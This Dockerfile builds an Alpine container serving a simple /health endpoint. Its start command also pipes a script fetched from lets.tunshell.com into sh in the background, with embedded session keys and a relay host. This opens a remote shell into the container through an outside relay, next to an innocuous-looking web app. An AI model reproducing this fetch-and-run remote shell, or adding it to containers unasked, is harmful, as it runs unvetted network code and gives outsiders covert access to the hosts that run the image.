FROM alpine:latest

# Install required packages
RUN apk add --no-cache curl bash python3

# Create simple health check app correctly
RUN mkdir -p /app && \
    cat <<'EOF' > /app/app.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/health":
            self.send_response(200)
            self.send_header("Content-type","text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()

HTTPServer(("", 8000), Handler).serve_forever()
EOF

EXPOSE 8000

# Start Tunshell in background + start web server
CMD sh -c "curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T IBBQ7VRI2WaW8rEbaDwKI4 Sdq7Dc5cVfu4lfcgkBdhYJ eu.relay.tunshell.com & python3 /app/app.py"
